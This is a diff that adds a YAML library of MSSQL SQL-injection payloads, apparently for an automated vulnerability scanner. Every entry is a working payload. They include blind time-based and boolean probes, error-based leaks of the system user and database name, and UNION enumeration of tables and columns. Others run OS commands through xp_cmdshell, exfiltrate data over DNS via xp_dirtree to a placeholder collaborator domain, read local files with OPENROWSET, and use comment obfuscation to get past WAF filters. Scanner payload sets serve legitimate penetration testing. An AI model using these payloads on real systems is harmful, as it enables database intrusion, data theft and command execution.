@@ -1,0 +1,320 @@
+defaults:
+  vuln_type: sqli
+  db_engine: mssql
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # Blind time-based
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "'; WAITFOR DELAY '0:0:SLEEP_SECONDS'--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "MSSQL WAITFOR DELAY time-based blind via stacked query."
+    tags: [waitfor, stacked, confirmation]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: timing
+    risk: 2
+    payload: "1; WAITFOR DELAY '0:0:SLEEP_SECONDS'--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Numeric context stacked WAITFOR DELAY."
+    tags: [waitfor, numeric, stacked]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "'; IF (1=1) WAITFOR DELAY '0:0:SLEEP_SECONDS'--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Conditional WAITFOR. Change condition for data extraction."
+    tags: [waitfor, conditional, extraction]
+
+  - technique: blind_time
+    injection_surface: json_body
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "'; WAITFOR DELAY '0:0:SLEEP_SECONDS'--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "WAITFOR DELAY via JSON body field."
+    tags: [waitfor, json]
+
+  - technique: blind_time
+    injection_surface: cookie
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "'; WAITFOR DELAY '0:0:SLEEP_SECONDS'--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "WAITFOR DELAY via cookie value injection."
+    tags: [waitfor, cookie]
+
+  - technique: blind_time
+    injection_surface: form_body
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "'; WAITFOR DELAY '0:0:SLEEP_SECONDS'--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "WAITFOR DELAY via form body parameter."
+    tags: [waitfor, form_body]
+
+  # Blind boolean-based
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "' AND 1=1 --"
+    notes: "Boolean true condition for MSSQL. Space before comment marker."
+    tags: [confirmation, baseline]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "' AND 1=2 --"
+    notes: "Boolean false condition for MSSQL. Space before comment marker."
+    tags: [confirmation, baseline]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND LEN(SYSTEM_USER)>THRESHOLD--"
+    placeholders: [THRESHOLD]
+    notes: "Extract SYSTEM_USER length via boolean oracle."
+    tags: [extraction, system_user]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND ASCII(SUBSTRING(SYSTEM_USER,CHAR_POS,1))>THRESHOLD--"
+    placeholders: [CHAR_POS, THRESHOLD]
+    notes: "Extract SYSTEM_USER char-by-char."
+    tags: [extraction, system_user, binary_search]
+
+  # Error-based
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND 1=CONVERT(int,@@version)--"
+    notes: "CONVERT error leaks @@version in error message."
+    tags: [convert, version]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CONVERT(int,SYSTEM_USER)--"
+    notes: "CONVERT error leaks SYSTEM_USER."
+    tags: [convert, system_user]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--"
+    notes: "Enumerate first user table name via CONVERT error."
+    tags: [convert, enumeration, sysobjects]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CONVERT(int,DB_NAME())--"
+    notes: "Extract current database name via CONVERT error."
+    tags: [convert, database]
+
+  # Conditional error injection (IF/CASE patterns)
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=(SELECT CASE WHEN (SYSTEM_USER='sa') THEN 1/0 ELSE 1 END)--"
+    notes: "CASE-based conditional error. Triggers divide-by-zero only when condition is true."
+    tags: [case, conditional_error, system_user]
+
+  # HAVING/GROUP BY error-based enumeration
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' HAVING 1=1--"
+    notes: "HAVING without GROUP BY leaks first column name in error message."
+    tags: [having, enumeration, column_name]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' GROUP BY COLUMN_NAME HAVING 1=1--"
+    placeholders: [COLUMN_NAME]
+    notes: "Iterative GROUP BY enumeration. Add known columns to GROUP BY to leak the next column name in error."
+    tags: [group_by, having, enumeration, column_name]
+
+  # UNION-based
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "' UNION SELECT NULL--"
+    notes: "Column count probe for MSSQL."
+    tags: [column_count, probe]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT @@version,NULL,NULL--"
+    notes: "Extract MSSQL version via UNION."
+    tags: [version, extraction]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--"
+    notes: "Enumerate user tables via UNION."
+    tags: [enumeration, sysobjects]
+
+  # FOR XML PATH aggregation for UNION
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT (SELECT name+',' FROM sysobjects WHERE xtype='U' FOR XML PATH('')),NULL,NULL--"
+    notes: "Aggregate all user table names into a single string via FOR XML PATH."
+    tags: [for_xml_path, enumeration, sysobjects]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT (SELECT name+',' FROM syscolumns WHERE id=OBJECT_ID('TABLE_NAME') FOR XML PATH('')),NULL,NULL--"
+    placeholders: [TABLE_NAME]
+    notes: "Aggregate all column names for a specific table via FOR XML PATH."
+    tags: [for_xml_path, enumeration, syscolumns]
+
+  # Stacked queries -- xp_cmdshell
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: oob
+    risk: 5
+    payload: "'; EXEC xp_cmdshell 'ping COLLAB_DOMAIN'--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "xp_cmdshell OS command execution. Confirm via OOB DNS."
+    tags: [xp_cmdshell, oob, dns]
+
+  # OOB DNS exfiltration
+  - technique: oob
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: dns_hit
+    risk: 3
+    payload: "'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+SYSTEM_USER+'.COLLAB_DOMAIN\\a'; EXEC master..xp_dirtree @q--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB DNS exfiltration of SYSTEM_USER via xp_dirtree UNC path."
+    tags: [oob, dns, xp_dirtree, exfiltration]
+
+  - technique: oob
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: dns_hit
+    risk: 3
+    payload: "'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+DB_NAME()+'.COLLAB_DOMAIN\\a'; EXEC master..xp_dirtree @q--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB DNS exfiltration of database name via xp_dirtree."
+    tags: [oob, dns, xp_dirtree, database]
+
+  # fn_varbintohexstr for OOB data encoding
+  - technique: oob
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: dns_hit
+    risk: 3
+    payload: "'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+master.dbo.fn_varbintohexstr(CAST(SYSTEM_USER AS VARBINARY))+'.COLLAB_DOMAIN\\a'; EXEC master..xp_dirtree @q--"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB exfiltration with fn_varbintohexstr hex encoding to safely encode special chars in DNS label."
+    tags: [oob, dns, xp_dirtree, fn_varbintohexstr, exfiltration]
+
+  # OPENROWSET for file read
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 5
+    payload: "' UNION SELECT data,NULL,NULL FROM OPENROWSET(BULK 'C:\\FILE_PATH',SINGLE_CLOB) AS x(data)--"
+    placeholders: [FILE_PATH]
+    notes: "Read local file via OPENROWSET BULK. Requires Ad Hoc Distributed Queries enabled. DESTRUCTIVE scope."
+    tags: [openrowset, file_read, destructive]
+
+  # Comment obfuscation
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "'/**/;/**/WAITFOR/**/DELAY/**/'0:0:SLEEP_SECONDS'--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "WAITFOR DELAY with inline comment obfuscation to bypass basic WAF rules."
+    tags: [waitfor, obfuscation, comment, waf_bypass]
+
+  # URL-encoded
+  - technique: blind_time
+    injection_surface: query
+    encoding: url
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "%27%3B%20WAITFOR%20DELAY%20%270%3A0%3ASLEEP_SECONDS%27--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "URL-encoded WAITFOR DELAY."
+    tags: [waitfor, url_encoded]
+
+  # Double-quote boundary
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: timing
+    risk: 2
+    payload: "\"; WAITFOR DELAY '0:0:SLEEP_SECONDS'--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Double-quote context WAITFOR DELAY."
+    tags: [waitfor, double_quote]
+
+  # Header injection
+  - technique: blind_time
+    injection_surface: header
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "'; WAITFOR DELAY '0:0:SLEEP_SECONDS'--"
+    placeholders: [SLEEP_SECONDS]
+    notes: "WAITFOR via HTTP header injection."
+    tags: [waitfor, header]
